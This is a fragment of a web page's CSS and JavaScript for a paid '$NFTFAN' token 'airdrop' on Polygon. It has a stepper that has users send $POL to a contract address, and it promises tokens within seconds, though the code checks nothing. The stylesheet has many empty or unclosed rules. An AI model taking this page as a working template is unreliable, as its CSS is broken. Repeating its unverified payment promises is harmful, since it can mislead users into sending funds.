  --background: #f6f8fb;
  --card-bg: #ffffff;
  --card-bg-hover: #f0f4f8;
  --input-bg: #f3f6fb;
  --accent: #5c8df6;
  --accent-light: #eaf1fe;
  --accent2: #f6705c;
  --accent2-light: #fce9e6;
  --accent3: #53d4be;
  --accent3-light: #e5f8f4;
  --text: #24324d;
  --text-bright: #1d2233;
  --muted: #a5acc5;
  --error: #f64e60;
  --success: #53d4be;
  --warning: #ffe083;
  --radius: 10px;
  --radius-lg: 18px;
  --shadow: 0 2px 10px 0 rgba(44, 51, 73, 0.08);
  --shadow-hover: 0 6px 24px 0 rgba(44, 51, 73, 0.13);

* {

  margin: 0;
  padding: 0;
  font-family: var(--font-family);
  font-size: var(--font-size-max);
}
html, body {

  color: var(--text);
  min-height: 100vh;
  width: 100vw;
  overflow-x: hidden;
  line-height: 1.7;
  font-size: var(--font-size-max);
}
.cyberpunk-container {

  margin: 28px auto;
  padding: 0 18px;
}
.card {
  background: var(--card-bg);

h1, h2, h3, h4 {

h1 {

h2 {

h3 { font-size: 9px; color: var(--accent2);}

.input-container {

.error-text { color: var(--error); }

.refresh-btn {

}
.how-to-get-tokens ol {

}
.how-to-get-tokens ol li {

}
.how-to-get-tokens .highlight {

}
.airdrop-address {

  margin: 5px 0;

  font-size: 8px;
}
.airdrop-address:hover {

}
.airdrop-address-text {
  font-family: inherit;
  font-weight: 600;
  color: var(--accent3);
  font-size: 8px;
  word-break: break-all;
  flex: 1;
  overflow: hidden;
  text-overflow: ellipsis;
}
.copy-btn {
  background: transparent;
  border: none;
  color: var(--accent3);
  cursor: pointer;
  padding: 2px 4px;
  border-radius: var(--radius);
  transition: background 0.18s, color 0.18s;
  display: flex;
  align-items: center;
  gap: 3px;
  font-weight: 600;
  font-size: 8px;
}
.copy-btn:hover {
  background: var(--accent3-light);
  color: var(--accent3);
}
.copy-btn .material-icons, .copy-btn svg {
  font-size: 8px;
}
.copy-tooltip {
  position: absolute;
  background: var(--card-bg);
  color: var(--success);
  padding: 2px 6px;
  border-radius: var(--radius);
  font-size: 8px;
  opacity: 0;
  transition: opacity 0.2s;
  pointer-events: none;
  top: -18px;
  right: 0;
  border: 1px solid var(--success);
  box-shadow: 0 0 3px rgba(83, 212, 190, 0.12);
  z-index: 10;
}
.copy-btn.copied .copy-tooltip {
  opacity: 1;
  animation: fadeOut 1.5s forwards;
}
@keyframes fadeOut {
  0% { opacity: 1; }
  70% { opacity: 1; }
  100% { opacity: 0; }
}
.note {
  background: var(--warning);
  background: #fffbe6;
  border-left: 3px solid var(--warning);
  padding: 6px 10px;
  margin: 5px 0;
  border-radius: 0 var(--radius) var(--radius) 0;
  font-size: 8px;
  color: #8d7c1e;
}
.note .material-icons, .note svg {
  font-size: 8px;
  vertical-align: middle;
  margin-right: 2px;
  color: var(--warning);
}
.transactions {

}
.transaction-list {
  max-height: 120px;
  overflow-y: auto;
  margin-top: 7px;
  font-size: 8px;
}
.transaction-item {
  background: var(--input-bg);
  border-radius: var(--radius);
  padding: 7px;
  margin-bottom: 5px;
  border: 1px solid #e7ecf3;
  display: flex;
  align-items: center;
  justify-content: space-between;
  transition: border 0.18s, box-shadow 0.18s;
  font-size: 8px;
}
.transaction-item:hover {
  border-color: var(--accent);
  box-shadow: 0 2px 7px 0 var(--accent-light);
}
.transaction-item:last-child {
  margin-bottom: 0;
}
.transaction-left {
  display: flex;
  align-items: center;
  gap: 6px;
}
.transaction-icon {
  color: var(--success);
  font-size: 8px;
}
.transaction-info {
  display: flex;
  flex-direction: column;
  font-size: 8px;
}
.transaction-address {
  font-size: 8px;
  color: var(--text);
  font-weight: 600;
}
.transaction-time {
  font-size: 8px;
  color: var(--muted);
}
.transaction-amount {
  font-weight: 700;
  color: var(--success);
  font-size: 8px;
}
.loading-indicator {
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 10px;
  color: var(--muted);
  font-size: 8px;
}
.loading-indicator .material-icons, .loading-indicator svg {
  margin-right: 4px;
  animation: spin 1.5s linear infinite;
  font-size: 8px;
}
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.material-icons, i, svg {
  vertical-align: middle;
  font-size: var(--icon-size);
}
/* Responsive design */
@media (max-width: 768px) {

/* Stepper CSS */
.stepper-container {
  margin: 18px 0;
  background: var(--card-bg-hover);
  border-radius: var(--radius-lg);
  padding: 18px 15px;
  box-shadow: 0 1px 9px 0 rgba(44, 51, 73, 0.09);
}
.stepper {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 22px;
  position: relative;
}
.stepper-step {
  display: flex;
  align-items: center;
  width: 100%;
  position: relative;
  transition: all 0.5s cubic-bezier(.64,.09,.08,1);
  opacity: 0.5;
  transform: scale(0.98);
  filter: grayscale(70%);
}
.stepper-step.active {
  opacity: 1;
  filter: none;
  transform: scale(1.05);
  animation: stepActivePop 0.45s cubic-bezier(.5,1.7,.7,1) both;
}
@keyframes stepActivePop {
  0% { transform: scale(0.96);}
  70% { transform: scale(1.08);}
  100% { transform: scale(1.05);}
}
.stepper-dot {
  width: 29px;
  height: 29px;
  min-width: 29px;
  min-height: 29px;
  border-radius: 50%;
  background: linear-gradient(135deg, var(--accent) 40%, var(--accent3) 100%);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #fff;
  font-weight: 700;
  font-size: 14px;
  box-shadow: 0 2px 10px 0 rgba(44, 51, 73, 0.12);
  position: relative;
  z-index: 1;
  margin-right: 11px;
  border: 2px solid #fff;
  transition: background 0.3s, box-shadow 0.3s;
}
.stepper-step.active .stepper-dot {
  background: linear-gradient(135deg, var(--accent3) 40%, var(--accent) 100%);
  box-shadow: 0 4px 18px 0 var(--accent-light);
}
.stepper-label {
  font-family: 'Orbitron', 'Rajdhani', Arial, sans-serif;
  font-size: 10.2px;
  font-weight: 700;
  color: var(--accent);
  letter-spacing: 0.2px;
}
.stepper-desc {
  font-size: 8.5px;
  color: var(--text);
  margin-top: 1px;
  margin-bottom: 2px;
  font-family: 'Rajdhani', Arial, sans-serif;
}
.stepper-content {
  flex: 1;
  display: flex;
  flex-direction: column;
}
.stepper-connector {
  width: 2px;
  height: 38px;
  background: linear-gradient(180deg, var(--accent-light), var(--accent3-light));
  position: absolute;
  left: 13.5px;
  top: 30px;
  z-index: 0;
  border-radius: 5px;
}
@media (max-width: 480px) {
  .stepper-dot { width: 22px; height: 22px; font-size: 10px; min-width: 22px; min-height: 22px;}
  .stepper-label { font-size: 9px;}
  .stepper-desc { font-size: 7px;}
  .stepper-connector { left: 9px;}
}
.stepper-action {
  margin-top: 8px;
  display: flex;
  align-items: center;
  gap: 8px;
}
.stepper-action input[type="text"] {
  flex: 1;
  min-width: 120px;
  font-size: 9px;
  padding: 7px 8px;
  border-radius: var(--radius);
  border: 1px solid #e7ecf3;
  background: var(--input-bg);
  color: var(--text-bright);
  outline: none;
}
.stepper-action input[type="number"] {
  width: 80px;
  font-size: 9px;
  padding: 7px 8px;
  border-radius: var(--radius);
  border: 1px solid #e7ecf3;
  background: var(--input-bg);
  color: var(--text-bright);
  outline: none;
}
.stepper-action .btn {
  padding: 7px 14px;
  font-size: 10px;
  font-family: inherit;
  border-radius: 8px;
}
.stepper-action .copy-btn {
  font-size: 9px;
  padding: 2px 5px;
}
.success-checkmark {
  display: inline-block;
  width: 26px;
  height: 26px;
  border-radius: 50%;
  background: var(--success);
  position: relative;
  margin-right: 11px;
}
.success-checkmark:after {
  content: '';
  position: absolute;
  left: 7px; top: 11px;
  width: 5px; height: 9px;
  border: solid #fff;
  border-width: 0 3px 3px 0;
  border-radius: 1px;
  transform: rotate(45deg);
  animation: checkmarkAnim 0.6s cubic-bezier(.33,1.5,.74,1) both;
}
@keyframes checkmarkAnim {
  from { width:0; height:0;}
  60% { width: 5px; height:0;}
  to { width:5px; height:9px;}
}
.anim-bounce {
  animation: bounceAnim 0.8s cubic-bezier(.36,1.7,.47,1.2) both;
}
@keyframes bounceAnim {
  0% { transform: scale(1);}
  30% { transform: scale(1.12);}
  50% { transform: scale(0.97);}
  70% { transform: scale(1.05);}
  100% { transform: scale(1);}
}
/* Tabs Interface CSS */
.tabs { display: flex; border-bottom: 2px solid #e0e5ef; margin-bottom: 12px; }
.tab-btn {

.tab-btn.active {

  border-bottom: 3px solid var(--accent);
  background: var(--accent-light);
}
.tab-content { display: none;}
.tab-content.active { display: block;}

      return new Intl.NumberFormat().format(num);
    }

    function timeAgo(timestamp) {
      const seconds = Math.floor((new Date() - new Date(timestamp * 1000)) / 1000);
      let interval = Math.floor(seconds / 31536000);
      if (interval > 1) return interval + " years ago";
      if (interval === 1) return interval + " year ago";
      interval = Math.floor(seconds / 2592000);
      if (interval > 1) return interval + " months ago";
      if (interval === 1) return interval + " month ago";
      interval = Math.floor(seconds / 86400);
      if (interval > 1) return interval + " days ago";
      if (interval === 1) return interval + " day ago";
      interval = Math.floor(seconds / 3600);
      if (interval > 1) return interval + " hours ago";
      if (interval === 1) return interval + " hour ago";
      interval = Math.floor(seconds / 60);
      if (interval > 1) return interval + " minutes ago";
      if (interval === 1) return interval + " minute ago";
      if(seconds < 10) return "just now";
      return Math.floor(seconds) + " seconds ago";
    }

    function shortenAddress(address) {
      return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
    }

    async function getBalance() {
      const wallet = document.getElementById("wallet").value.trim();
      const resultDiv = document.getElementById("result");
      const resultContainer = document.getElementById("resultContainer");

      resultContainer.className = "result-container";

      if (!wallet) {
        resultDiv.innerHTML = "<span class='error-text'>Please enter a wallet address.</span>";
        resultContainer.classList.add("error");
        return;
      }
      if (!validateEthAddress(wallet)) {
        resultDiv.innerHTML = "<span class='error-text'>Invalid Polygon (EVM) address.<br>It should start with 0x and be 42 characters.</span>";
        resultContainer.classList.add("error");
        return;
      }

      resultDiv.innerHTML = "<span class='material-icons loading'>sync</span> Checking balance...";

      const url = `https://api.polygonscan.com/api?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${wallet}&tag=latest&apikey=${apiKey}`;

      try {
        const res = await fetch(url);
        const data = await res.json();
        if (data.status === "1") {
          const decimals = 18;
          let balance = Number(data.result) / 10 ** decimals;
          let display = formatNumber(balance);
          resultDiv.innerHTML = `<span class='success-text'>${display}</span> <span class='info-text'>$NFTFAN</span>`;
          resultContainer.classList.add("success");
        } else {
          resultDiv.innerHTML = "<span class='error-text'>Error fetching balance. Check the address or try again later.</span>";
          resultContainer.classList.add("error");
        }
      } catch (err) {
        resultDiv.innerHTML = "<span class='error-text'>Network error. Please try again later.</span>";
        resultContainer.classList.add("error");
      }
    }

    async function fetchTokensLeft() {
      const tokensLeftValue = document.getElementById('tokensLeftValue');
      tokensLeftValue.innerHTML = "<span class='material-icons loading'>sync</span>";

      const url = `https://api.polygonscan.com/api?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${airdropContract}&tag=latest&apikey=${apiKey}`;

      try {
        const res = await fetch(url);
        const data = await res.json();
        if (data.status === "1") {
          const decimals = 18;
          let balance = Number(data.result) / 10 ** decimals;
          let display = formatNumber(balance);
          tokensLeftValue.textContent = display;
        } else {
          tokensLeftValue.innerHTML = "<span class='error-text'>Error</span>";
        }
      } catch (err) {
        tokensLeftValue.innerHTML = "<span class='error-text'>Error</span>";
      }
    }

    // --- STEPPER LOGIC ---
    const stepperSteps = [
      {
        label: "Step 1: Connect Wallet",
        desc: "Paste your EVM wallet address for receiving $NFTFAN.",
        render: function(active) {
          return `
            <div class="stepper-action">
              <input type="text" id="stepWallet" placeholder="0x..." maxlength="42" autocomplete="off"/>
              <button class="btn" type="button" onclick="moveToStep(1)">Continue</button>
            </div>
          `;
        },
        validate: function() {
          const v = document.getElementById('stepWallet').value.trim();
          if (!validateEthAddress(v)) {
            alert('Please enter a valid 0x wallet address!');
            return false;
          }
          window.stepperWallet = v;
          return true;
        }
      },
      {
        label: "Step 2: Enter Amount",
        desc: "Choose how much $POL (MATIC) to spend (0.01 - 100 $POL).",
        render: function(active) {
          return `
            <div class="stepper-action">
              <input type="number" id="stepAmount" min="0.01" max="100" step="0.01" placeholder="Amount (e.g. 1.5)" />
              <button class="btn" type="button" onclick="moveToStep(2)">Continue</button>
            </div>
          `;
        },
        validate: function() {
          const val = Number(document.getElementById('stepAmount').value);
          if (isNaN(val) || val < 0.01 || val > 100) {
            alert('Enter an amount between 0.01 and 100 $POL');
            return false;
          }
          window.stepperAmount = val;
          return true;
        }
      },
      {
        label: "Step 3: Send $POL",
        desc: `Send funds to the airdrop contract. <br>
                <b>Address:</b> <span class="airdrop-address-text" id="stepAirdropAddr">${airdropContract}</span>`,
        render: function(active) {
          return `
            <div class="stepper-action">
              <input type="text" value="${airdropContract}" id="stepAirdropAddrInput" readonly style="width:170px">
              <button class="copy-btn" type="button" onclick="copyAirdropAddress(this, 'stepAirdropAddrInput')">
                <span class="material-icons">content_copy</span> Copy
                <span class="copy-tooltip">Copied!</span>
              </button>
            </div>
            <div class="muted-text" style="margin-top:5px;">
              Send exactly <b>${window.stepperAmount || 1} $POL</b> from your wallet.<br>
              <a href="https://polygonscan.com/address/${airdropContract}" target="_blank" style="color:var(--accent2);font-weight:600;">View contract</a>
            </div>
            <div class="stepper-action" style="margin-top:7px;">
              <button class="btn btn-secondary" type="button" onclick="moveToStep(3)">I've Sent Funds</button>
            </div>
          `;
        },
        validate: function() {
          // Optionally ask for transaction hash for UX; for now, just continue
          return true;
        }
      },
      {
        label: "Step 4: Wait for Airdrop",
        desc: "Within a few seconds, you'll receive $NFTFAN tokens in your wallet.",
        render: function(active) {
          return `
            <div class="loading-indicator anim-bounce" style="margin: 10px 0;">
              <span class="material-icons">sync</span> Waiting for airdrop...
            </div>
            <div class="stepper-action">
              <button class="btn" type="button" onclick="moveToStep(4)">Check My $NFTFAN Balance</button>
            </div>
          `;
        },
        validate: function() { return true; }
      },
      {
        label: "Step 5: Success!",
        desc: "Check your $NFTFAN balance below. Enjoy your tokens!",
        render: function(active) {
          return `
            <div class="stepper-action" style="gap:0;">
              <span class="success-checkmark"></span>
              <span class="success-text" style="font-size:11px;font-weight:700;">Congratulations!</span>
            </div>
            <div class="stepper-action" style="margin-top:8px;">
              <button class="btn btn-secondary" type="button" onclick="resetStepper()">Buy More</button>
            </div>
          `;
        },
        validate: function() { return true; }
      }
    ];

    // Stepper state
    let currentStep = 0;

    function renderStepper() {
      const stepper = document.getElementById('stepper');
      stepper.innerHTML = '';
      for (let i = 0; i < stepperSteps.length; i++) {
        const st = stepperSteps[i];
        const isActive = i === currentStep;
        const stepDiv = document.createElement('div');
        stepDiv.className = 'stepper-step' + (isActive ? ' active anim-bounce' : '');
        stepDiv.innerHTML = `
          <div class="stepper-dot">${i + 1}</div>
          <div class="stepper-content">
            <div class="stepper-label">${st.label}</div>
            <div class="stepper-desc">${st.desc}</div>
            ${isActive ? st.render(isActive) : ''}
          </div>
        `;
        if (i < stepperSteps.length - 1) {
          const connector = document.createElement('div');
          connector.className = 'stepper-connector';
          stepDiv.appendChild(connector);
        }
        stepper.appendChild(stepDiv);
      }
    }

    function moveToStep(idx) {
      // Validate current step before moving
      if (typeof stepperSteps[currentStep].validate === 'function') {
        if (!stepperSteps[currentStep].validate()) return;
      }
      currentStep = idx;
      // Save stepperAmount to step 3 if needed
      if (currentStep === 2) stepperSteps[2].desc = `Send funds to the airdrop contract. <br>
        <b>Address:</b> <span class="airdrop-address-text" id="stepAirdropAddr">${airdropContract}</span><br>
        <span class="muted-text" style="font-size:8px;">Send exactly <b>${window.stepperAmount} $POL</b> from your wallet</span>
      `;
      renderStepper();
      if (currentStep === 4) {
        // Step 5: scroll to balance checker
        setTimeout(() => {
          document.getElementById("wallet").value = window.stepperWallet || "";
          getBalance();
        }, 400);
      }
    }

    function resetStepper() {
      currentStep = 0;
      window.stepperWallet = "";
      window.stepperAmount = "";
      renderStepper();
    }

    // Copy button for airdrop address (stepper version)
    function copyAirdropAddress(btn, inputId = 'airdropAddr') {
      let address = inputId === 'airdropAddr'
        ? document.getElementById(inputId).innerText
        : document.getElementById(inputId).value;
      if (navigator && navigator.clipboard) {
        navigator.clipboard.writeText(address).then(() => {
          btn.classList.add('copied');
          setTimeout(() => btn.classList.remove('copied'), 1500);
        });
      } else {
        const textarea = document.createElement("textarea");
        textarea.value = address;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand("copy");
        document.body.removeChild(textarea);
        btn.classList.add('copied');
        setTimeout(() => btn.classList.remove('copied'), 1500);
      }
    }

    // --- Buyers list logic ---
    async function fetchRecentBuyers() {
      const buyersList = document.getElementById('buyersList');
      buyersList.innerHTML = '<div class="loading-indicator"><span class="material-icons">sync</span> Loading recent buyers...</div>';
      const url = `https://api.polygonscan.com/api?module=account&action=txlist&address=${airdropContract}&page=1&offset=20&sort=desc&apikey=${apiKey}`;
      try {
        const res = await fetch(url);
        const data = await res.json();
        if (data.status === "1" && data.result.length > 0) {
          buyersList.innerHTML = '';
          let shownCount = 0;
          for (const tx of data.result) {
            if (tx.to && tx.to.toLowerCase() === airdropContract.toLowerCase() && Number(tx.value) > 0) {
              shownCount++;
              const txTime = timeAgo(tx.timeStamp);
              const fromAddress = shortenAddress(tx.from);
              const value = Number(tx.value) / 10 ** 18;
              const txElement = document.createElement('div');
              txElement.className = 'transaction-item';
              txElement.innerHTML = `
                <div class="transaction-left">
                  <div class="transaction-icon">
                    <span class="material-icons">shopping_cart</span>
                  </div>
                  <div class="transaction-info">
                    <div class="transaction-address">
                      ${fromAddress}
                    </div>
                    <div class="transaction-time">${txTime}</div>
                  </div>
                </div>
                <div class="transaction-amount">${value.toFixed(4)} $POL</div>
              `;
              txElement.addEventListener('click', () => {
                window.open(`https://polygonscan.com/tx/${tx.hash}`, '_blank');
              });
              txElement.style.cursor = 'pointer';
              buyersList.appendChild(txElement);
              if (shownCount >= 10) break;
            }
          }
          if (shownCount === 0) {
            buyersList.innerHTML = '<div class="muted-text">No recent buyers found.</div>';
          }
        } else {
          buyersList.innerHTML = '<div class="muted-text">No recent buyers found.</div>';
        }
      } catch (err) {
        buyersList.innerHTML = '<div class="error-text">Failed to load buyers.</div>';
      }
    }

    document.getElementById("wallet").addEventListener('keydown', function(e) {
      if (e.key === "Enter") {
        getBalance();
        e.preventDefault();
        return false;
      }
    });

    document.addEventListener('DOMContentLoaded', function() {
      fetchTokensLeft();
      fetchRecentBuyers();
      renderStepper();

      setInterval(() => {
        fetchTokensLeft();
        fetchRecentBuyers();
      }, 30000);

      // Tab switching
      document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', function() {
          document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
          btn.classList.add('active');
          const tab = btn.getAttribute('data-tab');
          document.querySelectorAll('.tab-content').forEach(tc => {
            tc.classList.toggle('active', tc.id === tab);
          });
        });
      });
    });
  </script>
</body>
